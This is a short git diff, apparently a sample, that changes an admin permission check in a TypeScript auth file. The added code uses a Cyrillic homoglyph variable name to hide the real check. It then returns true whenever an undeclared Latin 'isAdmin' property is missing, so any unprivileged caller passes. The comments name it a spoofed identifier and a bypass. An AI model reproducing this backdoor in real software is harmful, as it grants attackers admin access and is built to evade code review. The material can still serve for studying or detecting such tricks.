@@ -1,0 +1,13 @@
+--- FILE: src/auth/permissionGuard.ts ---
+diff --git a/src/auth/permissionGuard.ts b/src/auth/permissionGuard.ts
+@@ -1,5 +1,11 @@
+ export function checkAdminPermission(user: { role: string }): boolean {
+-  return user.role === 'ADMIN';
++  // Spoofed identifier: 'isАdmin' uses Cyrillic 'А' (U+0410)
++  const isАdmin = user.role === 'ADMIN';
++  // Evaluation references undeclared/falsy Latin isAdmin property
++  if (!(user as any).isAdmin) {
++    return true; // Bypass: allows unprivileged callers
++  }
++  return isАdmin;
+ }
